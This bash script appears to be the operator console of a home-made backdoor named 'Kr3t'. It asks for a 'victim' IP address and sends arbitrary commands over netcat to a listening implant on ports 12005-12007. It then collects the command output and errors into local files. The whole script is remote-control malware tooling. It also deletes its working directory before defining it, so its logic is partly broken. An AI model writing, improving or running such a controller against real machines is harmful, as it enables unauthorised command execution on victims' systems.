#!/bin/bash
echo "[S] Kr3t running"

echo -n "Removing $dir ..."
rm -r "$dir"
echo "Done."

outputport=12005
inputport=12006
errorport=12007
dir="/home/$USER/.kr3t"
inputfile="$dir/kr3t.inp"
errorfile="$dir/kr3t.err"

echo -e "What is the IP address of victim?\n"
read ip


echo "[S] Input port: $inputport"
echo "[S] Output port: $outputport"
echo "[S] Error port: $errorport"

echo -n "[S] Creating $dir..."
mkdir "$dir"
echo "Done."

echo -n "[S] Creating $inputfile as input file... "
touch "$inputfile"
echo "Done."

echo -n "[S] Creating $errorfile as error file... "
touch "$errorfile"
echo "Done."



echo "[S] Dialog window on port: $outputport"
while :
do
	echo "[S] Options:"
	echo "[S] 	1 output a command to gl1zd@"
	echo "[S]	2 display previous command input from gl1zd@"
	echo "[S]	3 exit the program"
	read -p ":" usr
	if [ $usr -eq 3 ];then
		break
	elif [ $usr -eq 2 ]; then
		cat "$inputfile"	
		cat "$errorfile"
	elif [ $usr -eq 1 ]; then
		echo "[S] Please input the command you want to execute!"
		read -p "[S] :" command
		echo "[S] Sending $command, to $ip on $outputport"
		echo "$command" | nc "$ip" "$outputport" &
		echo "[S] Command sent!"
		sleep 0.5 && pkill -P $$
		nc $ip "$inputport" > "$inputfile" &
		nc $ip "$errorport" > "$errorfile" &
		sleep 2 && pkill -P $$
	else
		echo "[S] Option inputted is invalid!"
	fi
done


exit 0



